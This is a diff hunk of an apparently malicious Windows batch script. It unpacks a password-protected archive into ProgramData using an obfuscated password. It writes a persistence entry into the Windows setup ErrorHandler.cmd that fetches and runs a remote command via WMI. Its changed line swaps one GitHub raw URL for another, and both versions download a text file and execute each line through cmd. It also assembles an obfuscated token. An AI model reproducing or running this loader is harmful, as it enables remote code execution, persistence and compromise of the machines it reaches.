@@ -20,7 +20,7 @@ for %%a in (%processList%) do (
 "%ProgramData%\dist\UnRAR.exe" x -y -p%JVPCOT%1%RPJJKX%4%OJ ERZ%7%EUCUJK%8%ATXODM%5%DSJIDL%2%HTHDOT%3%AVVUYS%6%NZDNDG%9 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
 echo @echo off >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
 echo powershell.exe -C "$c = (iwr 'https://github.com/githab0/0/raw/refs/heads/main/yconfig.txt' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
-powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githab0/0/refs/heads/main/2.txt' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
+powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/o/refs/heads/master/comfy.txt' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
 setlocal EnableDelayedExpansion
 set "TOKEN=%RTVMLT%7%YIOXTB%5%MPOKK %9%FWJ XM%6%ESUHAX%8%CNHLHJ%2%WHWVYB%7%RXXSIE%1%YU XKH%2%CRWJIT%9:% QIRUG%A%VAIEPD%A%DKZIJA%H%QNKQKG%v%YGC IQ%e%ON DVH%8%U DRYH%0%WTFWUA%J%IVHVUW%A%IKGBUO%0%DVTSQC%S%EAPSPJ%x%YZPDUR%O%BBNCRN%O%JUTDVL%H%ASGQNC%8%OEDCSU%v%LRGZYV%u%GFRQ S%t%ABDFJX%4-%JAFERX%y%CILNPP%X_%O KURA%d%HKWZYQ%G%ULSPPL%P%ZIWGTR%3%OG JWQ%D%JTQBCA%q%HHKDZZ%z%ALDQKG%O%EOU OH%K%UHGUFL%F%BYPGPE%4"
